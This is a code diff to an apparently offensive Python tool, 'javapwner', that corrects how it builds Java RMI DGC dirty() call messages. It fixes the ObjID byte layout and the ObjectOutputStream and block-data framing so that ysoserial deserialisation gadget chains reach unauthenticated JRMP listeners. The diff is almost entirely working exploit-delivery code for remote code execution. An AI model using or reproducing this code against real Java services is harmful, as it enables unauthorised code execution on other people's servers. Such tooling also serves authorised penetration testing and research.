@@ -36,7 +36,7 @@ from __future__ import annotations
 import struct
 from typing import Any
 
-from javapwner.core.socket_helper import read_java_ushort, read_java_utf, write_java_utf
+from javapwner.core.socket_helper import read_java_utf
 from javapwner.exceptions import JrmpError
 
 # JRMP constants
@@ -52,17 +52,17 @@ MSG_PING_ACK = 0x53
 MSG_DGC_ACK = 0x54
 
 # DGC Object IDs (fixed by the RMI spec)
-# ObjID wire format per JDK ObjID.write() / ObjID.read():
-#   objNum   : long  (int64, 8 bytes) — DGC = 2
-#   uid.unique: short (int16, 2 bytes) — 0
-#   uid.time  : long  (int64, 8 bytes) — 0
-#   uid.count : short (int16, 2 bytes) — 0
+# ObjID wire format per JDK ObjID.write() + UID.write():
+#   objNum     : long  (int64, 8 bytes) — DGC = 2
+#   uid.unique : int   (int32, 4 bytes) — 0  ← writeInt(), NOT writeShort()
+#   uid.time   : long  (int64, 8 bytes) — 0
+#   uid.count  : short (int16, 2 bytes) — 0
 _DGC_OBJ_ID = (
     struct.pack(">q", 2)   # objNum: long (8 bytes)
-    + struct.pack(">h", 0)  # uid.unique: short (2 bytes)
+    + struct.pack(">i", 0)  # uid.unique: int (4 bytes)
     + struct.pack(">q", 0)  # uid.time: long (8 bytes)
     + struct.pack(">h", 0)  # uid.count: short (2 bytes)
-)  # 20 bytes total
+)  # 22 bytes total
 
 # DGC.dirty() method hash (from JDK internals, for new-style hash dispatch)
 _DIRTY_METHOD_HASH = struct.pack(">q", -0x20EEFEA34D8A9697)  # 0xDF11015CB2C56B69 signed
@@ -142,28 +142,39 @@ def parse_jrmp_ack(data: bytes) -> dict[str, Any]:
 # DGC Dirty call builder
 # ---------------------------------------------------------------------------
 
+_OOS_HEADER = b"\xac\xed\x00\x05"  # JAVA_STREAM_MAGIC + JAVA_STREAM_VERSION
+
+
 def build_dgc_dirty_call(payload_bytes: bytes) -> bytes:
-    """Encapsulate *payload_bytes* in a JRMP DGC dirty call message.
+    """Encapsulate *payload_bytes* in a JRMP DGC dirty() call message.
 
-    The target DGC endpoint is present on every JRMP service by spec, making
-    this the universal delivery mechanism for ysoserial payloads against
-    unauthenticated JRMP listeners.
+    Correct wire format (proven by real JDK wire capture):
+      MSG_CALL (0x50)
+      AC ED 00 05         ObjectOutputStream header (before ObjID!)
+      77 22               TC_BLOCKDATA, 34 bytes
+      [DGC ObjID 22B]     inside block data
+      [op=1, 4 bytes]     inside block data  (dirty() = op 1)
+      [hash, 8 bytes]     inside block data  (DGC interface hash)
+      [object bytes]      gadget chain content without OOS header
 
-    The payload must already be a valid Java serialised object (e.g. produced
-    by ysoserial).  It is embedded directly as the argument to DGC.dirty().
+    *payload_bytes* must be a complete OOS stream (starts with AC ED 00 05).
+    The OOS header is stripped and the raw object content is embedded as the
+    argument that DGC.dirty() will deserialise.
     """
-    # -- JRMP Call message header --
-    # MessageType (1 byte)
-    msg = bytes([MSG_CALL])
+    block_data = _DGC_OBJ_ID + struct.pack(">i", 1) + _DGC_INTERFACE_HASH  # 34 bytes
 
-    # Call header: ObjID (20 bytes) + operation (4 bytes) + hash (8 bytes)
-    # operation index for dirty = 1 (0-based)
-    op_index = struct.pack(">i", 1)
-    msg += _DGC_OBJ_ID + op_index + _DGC_INTERFACE_HASH
+    # Strip the OOS header (AC ED 00 05) from the ysoserial payload.
+    # What remains is the raw TC_OBJECT / TC_ARRAY content that the server's
+    # MarshalInputStream.readObject() will deserialise as the first argument.
+    if payload_bytes[:2] == b"\xac\xed":
+        object_bytes = payload_bytes[4:]
+    else:
+        object_bytes = payload_bytes
 
-    # Embed the ysoserial payload directly (it IS the ObjectOutputStream stream
-    # that would normally contain the ObjID[] + long lease arguments — here we
-    # just deliver the gadget chain as an argument to trigger deserialisation).
-    msg += payload_bytes
-
-    return msg
+    return (
+        bytes([MSG_CALL])
+        + _OOS_HEADER                        # OOS header (comes first)
+        + bytes([0x77, len(block_data)])     # TC_BLOCKDATA, length=34
+        + block_data
+        + object_bytes
+    )
